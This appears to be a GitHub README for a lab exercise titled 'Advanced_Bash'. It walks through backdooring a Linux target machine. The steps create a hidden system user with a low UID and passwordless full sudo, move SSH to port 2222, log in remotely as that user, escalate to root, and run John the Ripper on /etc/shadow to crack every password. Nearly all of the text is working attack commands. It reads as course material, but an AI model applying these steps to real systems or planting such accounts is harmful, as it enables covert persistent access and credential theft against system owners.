# Advanced_Bash
Accomplishing the goal of maintaining access of a target machine by installing a backdoor.


## Step 1: Shadow People

1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:

**adduser --system --no-create-home sysd**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/a5ca22e065dbd3071b155b1fb557e9ff49bd6103/Images/Step%201%201.jpg)

2. Give your secret user a password:

**passwd sysd**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/a5ca22e065dbd3071b155b1fb557e9ff49bd6103/Images/Step%201%202.jpg)

3. Give your secret user a system UID < 1000:

**usermod -u 50 sysd**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/a5ca22e065dbd3071b155b1fb557e9ff49bd6103/Images/Step%201%203.jpg)

Give your secret user the same GID:


usermod -u 50 -g 50 sysd

Give your secret user full sudo access without the need for a password:


sysd ALL=(ALL) NOPASSWD:ALL

Test that sudo access works without your password:

sudo -l

sudo adduser --system --no-create-home test

Step 2: Smooth Sailing
Edit the sshd_config file:

 Port 2222



Step 3: Testing Your Configuration Update
Restart the SSH service:


systemctl reload sshd
Exit the root account:


exit
SSH to the target machine using your sysd account and port 2222:


ssh sysd@192.168.6.105 -p 2222

Use sudo to switch to the root user:


sudo su

Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:


ssh sysd@192.168.6.105 -p 2222
Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:


sudo su
john /etc/shadow

Passwords:


